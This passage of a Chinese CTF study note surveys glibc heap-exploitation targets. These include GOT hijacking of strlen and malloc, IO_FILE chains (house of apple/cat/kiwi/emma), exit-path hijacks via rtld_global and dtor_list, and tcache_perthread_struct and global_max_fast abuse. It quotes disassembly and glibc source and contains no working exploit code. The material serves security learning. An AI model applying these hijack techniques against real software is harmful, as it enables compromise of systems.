.got.plt:00000000001ED178 off_1ED178      dq offset __wcslen_ifunc
.got.plt:00000000001ED178                                         ; DATA XREF: j___wcslen_ifunc↑r
.got.plt:00000000001ED178                                         ; Indirect relocation
.got.plt:00000000001ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r
.got.plt:00000000001ED180                                         ; Indirect relocation
.got.plt:00000000001ED188 off_1ED188      dq offset __wcsnlen_ifunc
.got.plt:00000000001ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r
.got.plt:00000000001ED188                                         ; Indirect relocation
.got.plt:00000000001ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r
.got.plt:00000000001ED190                                         ; Indirect relocation
.got.plt:00000000001ED198 off_1ED198      dq offset _dl_allocate_tls_init
.got.plt:00000000001ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r
.got.plt:00000000001ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm
.got.plt:00000000001ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r
.got.plt:00000000001ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r
.got.plt:00000000001ED1A8                                         ; Indirect relocation
.got.plt:00000000001ED1B0 off_1ED1B0      dq offset __strnlen_ifunc
.got.plt:00000000001ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r
.got.plt:00000000001ED1B0 _got_plt        ends                    ; Indirect relocation
```

可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？

笔者在glibc2.34的源代码中进行了查找:

```c
// string/string.h
/* Return the length of S.  */
extern size_t strlen (const char *__s)
     __THROW __attribute_pure__ __nonnull ((1));

```


```c
// /sysdeps/alpha/strlen.S
// 
ENTRY(strlen)
#ifdef PROF
	ldgp	gp, 0(pv)
	lda	AT, _mcount
	jsr	AT, (AT), _mcount
	.prologue 1
#else
	.prologue 0
#endif

	ldq_u   t0, 0(a0)	# load first quadword (a0 may be misaligned)
	lda     t1, -1(zero)
	insqh   t1, a0, t1
	andnot  a0, 7, v0
	or      t1, t0, t0
	nop			# dual issue the next two on ev5
	cmpbge  zero, t0, t1	# t1 <- bitmask: bit i == 1 <==> i-th byte == 0
	bne     t1, $found

$loop:	ldq     t0, 8(v0)
	addq    v0, 8, v0	# addr += 8
	cmpbge  zero, t0, t1
	beq     t1, $loop

$found:	negq    t1, t2		# clear all but least set bit
	and     t1, t2, t1

	and     t1, 0xf0, t2	# binary search for that set bit
	and	t1, 0xcc, t3
	and	t1, 0xaa, t4
	cmovne	t2, 4, t2
	cmovne	t3, 2, t3
	cmovne	t4, 1, t4
	addq	t2, t3, t2
	addq	v0, t4, v0
	addq	v0, t2, v0
	nop			# dual issue next two on ev4 and ev5

	subq    v0, a0, v0
	ret

	END(strlen)
libc_hidden_builtin_def (strlen)
```

发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。

笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。

由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。

而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。

同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。

其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数

### IO_FILE 
在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流
- house of apple 2/house of cat: `_IO_wide_data`
	- 主打一个简单方便
- house of kiwi: `_IO_file_jumps`
	- 缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert
- house of emma: `_IO_cookie_jumps`

### exit()
- **rtld_global** 
基本上就是house of banana的攻击流程，缺点是ld的加载基址不确定，需要爆破，优点是只需要一次large bin attack即可。
- **dtor_list**
通过call_tls_dtors()来劫持控制流，但是需要劫持TCB.pointer_guard

## 辅助攻击

### tcache_perthread_struct
```c
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS]; // 2*0x40 = 0x80
  tcache_entry *entries[TCACHE_MAX_BINS]; // 8*0x40 = 0x200
} tcache_perthread_struct;
// 0x20+0x10*0x40 = 0x420  
```

tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。
在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。

一般是作为辅助攻击的方法，可以简化攻击链。

#### example
[[2021-DownUnder-note]]

### global_max_fast   
实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。

### heap_info 
直接攻击堆管理结构体，可以看看这篇帖子:[house-of-mind](http://phrack.org/issues/66/10.html)
#TODO 






